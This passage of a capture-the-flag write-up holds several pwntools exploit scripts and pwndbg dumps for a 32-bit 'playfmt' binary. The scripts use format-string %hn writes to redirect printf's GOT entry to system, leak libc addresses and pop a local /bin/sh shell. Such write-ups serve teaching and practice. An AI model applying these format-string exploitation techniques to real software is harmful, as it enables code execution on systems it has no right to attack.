&lt;buf>:    "%40976c%57$hn%2"...0x804a06f &lt;buf+15>:    "c%59$hn33333333"0x804a07e &lt;buf+30>:    ""pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 ('%409')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop17:005c│      0xffa0781c ◂— 0x0... ↓'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"33333333\0"</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"22222222"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%211c%11$hhn%31"...0x804a06f &lt;buf+15>:    "325c%7$hn444444"...0x804a07e &lt;buf+30>:    "44"pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae908:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d40c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d4693016:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d417:005c│      0xffa0781c ◂— 0x0... ↓pwndbg> n0x08048540 in do_fmt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────[ REGISTERS ]──────────────────────── EAX  0x7b38 EBX  0x0 ECX  0xffa052a0 ◂— 0x20202020 ('    ') EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 ESI  0x1 EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0 ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211') EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10─────────────────────────[ DISASM ]──────────────────────────   0x804853b &lt;do_fmt+64>    call   printf@plt &lt;0x80483a0> ► 0x8048540 &lt;do_fmt+69>    add    esp, 0x10   0x8048543 &lt;do_fmt+72>    jmp    do_fmt+6 &lt;0x8048501>    ↓   0x8048501 &lt;do_fmt+6>     sub    esp, 4   0x8048504 &lt;do_fmt+9>     push   0xc8   0x8048509 &lt;do_fmt+14>    push   buf &lt;0x804a060>   0x804850e &lt;do_fmt+19>    push   0   0x8048510 &lt;do_fmt+21>    call   read@plt &lt;0x8048390>   0x8048515 &lt;do_fmt+26>    add    esp, 0x10   0x8048518 &lt;do_fmt+29>    sub    esp, 4   0x804851b &lt;do_fmt+32>    push   4──────────────────────────[ STACK ]──────────────────────────00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc────────────────────────[ BACKTRACE ]──────────────────────── ► f 0  8048540 do_fmt+69   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16   f 2 f7eb0d60 _IO_2_1_stdout_   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18   f 4 f7eb03dc __exit_funcs   f 5 ffa07810   f 6 f7d15276 __libc_start_main+246pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d30c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b3016:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d317:005c│      0xffa0781c ◂— 0x0... ↓pwndbg> gotGOT protection: Partial RELRO | GOT functions: 6[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) ◂— sub    esp, 0xc[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) ◂— push   ebp[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) ◂— push   ebp[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) ◂— push   ebp[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'44444444\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"33333333"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"44444444"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#作者：23R3F</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  printf_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"**********leak printf_got************"</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> <span class="token string">'%6$x'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>ebp1 <span class="token operator">=</span> ebp2 <span class="token operator">-</span> <span class="token number">0x10</span>fmt_7 <span class="token operator">=</span> ebp2 <span class="token operator">-</span><span class="token number">0x0c</span>fmt_11 <span class="token operator">=</span> ebp2 <span class="token operator">+</span> <span class="token number">0x04</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf_got-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_1-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp1<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_2-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp2<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_7-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_7<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_11-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_11<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_7 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#由于ebp2已经指向了fmt_7，所以修改偏移量10处的ebp2即修改fmt_7</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_7 = prinf_got</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token triple-quoted-string string">'''这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作需要注意的是，要构造一个字符串“23r3f”来作标志，返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成'''</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_11 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_11</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_11 = prinf_got + 2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"******leaking the print_got_add*********"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%7$s'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"print_got_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> printf_addr <span class="token operator">-</span> printf_libc <span class="token operator">+</span> system_libclog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%7$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%11$hn'</span><span class="token triple-quoted-string string">'''这里需要注意的是，我们把system的地址的前后两个字节分别写到fmt-7和fmt-11中，在写入后两个字节的时候要注意减去前面输入的(system_addr &amp;0xffff))，这是因为%n写入操作是算累积输入的字符个数'''</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''这个时候输入参数到栈中，本来下一步程序会调用printf函数，但是此时printf函数的got表已经被修改为system的地址了，此时就会执行system并且从栈中取bin/sh参数于是就这样getshell'''</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#veritas501 --exp</span><span class="token comment" spellcheck="true">#coding = utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>p_printf <span class="token operator">=</span> <span class="token number">0x0804A010</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">'%6$x'</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>p_ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>p_7 <span class="token operator">=</span> p_ebp2<span class="token number">-0xc</span><span class="token comment" spellcheck="true">#7</span>p_11 <span class="token operator">=</span> p_ebp2<span class="token operator">+</span><span class="token number">4</span><span class="token comment" spellcheck="true">#11</span>p_ebp1 <span class="token operator">=</span> p_ebp2<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#6</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_7<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_7</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_printf<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_7->p_printf</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_11<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_11</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_printf<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_11->p_printf+2</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'here\x00'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"aaaa%7$s\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>printf <span class="token operator">=</span> u32<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak printf</span>system <span class="token operator">=</span> printf<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token 